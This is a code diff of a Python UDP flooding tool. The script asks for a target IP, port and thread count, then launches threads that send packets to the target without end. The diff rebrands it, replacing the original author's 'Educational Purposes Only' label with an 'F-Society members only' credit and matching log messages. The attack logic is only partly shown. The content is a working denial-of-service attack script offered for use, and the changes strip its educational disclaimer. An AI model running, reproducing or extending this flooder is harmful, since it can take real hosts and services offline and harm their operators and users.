@@ -5,8 +5,8 @@ import random
 import zlib
 import threading
 
-# Code Writed By @lolokooPE
-# Writed For Educational Purposes Only!
+# Code Written By @Hydra-0.0.0
+# For F-Society members only.
 
 def ngahhflooder(target_ip, target_port):
   pids = [
@@ -30,7 +30,7 @@ def ngahhflooder(target_ip, target_port):
         s.sendto(packet, (target_ip, target_port))
       s.close()
     except Exception as e:
-      print(f"[LolokoDoS] Error: {e}")
+      print(f"[F-Society] Error: {e}")
 
 banner = """
  _           _       _        ______      _____ 
@@ -39,7 +39,7 @@ banner = """
 | |    / _ \| |/ _ \| |/ / _ \| | | / _ \ `--. \
 | |___| (_) | | (_) |   < (_) | |/ / (_) /\__/ /
 \_____/\___/|_|\___/|_|\_\___/|___/ \___/\____/ 
-Coded By @lolokooPE - Educational Purposes Only
+Coded By @Hydra-0.0.0 - F-Society members only.
 """
 
 os.system("clear")
@@ -47,17 +47,17 @@ print(banner)
 print(" ")
 
 try:
-  target_ip = input("[?] Target IP: ")
-  target_port = int(input("[?] Target Port: "))
-  thrdc = int(input("[?] Threads (Def 100): "))
-  print("[LolokoDoS] Attack will start when all threads all ready.")
+  target_ip = input("[‽] Target IP: ")
+  target_port = int(input("[‽] Target Port: "))
+  thrdc = int(input("[‽] Threads (Def 100): "))
+  print("[F-Society] Attack will start when all threads all ready.")
   for i in range(thrdc):
     t = threading.Thread(target=ngahhflooder,args=(target_ip, target_port), daemon=True)
     t.start()
   os.system("clear")
   print(banner)
   print(" ")
-  print(">> Attack Started <<")
+  print(">> Attack Started! #F-Society <<")
   print(f"Target IP: {target_ip}")
   print(f"Target Port: {target_port}")
   print(f"Threads: {thrdc}")
@@ -65,6 +65,6 @@ try:
   while True:
     time.sleep(1) # so that the code nd threads doesnt stop
 except ValueError:
-  print("[LolokoDoS] Please Enter All Input's Correctly!")
+  print("[F-Society] Please Enter All Input's Correctly!")
 except KeyboardInterrupt:
-  print("[LolokoDoS] Program Stopped By User (Exit)")
+  print("[F-Society] Program Stopped By User (Exit)")
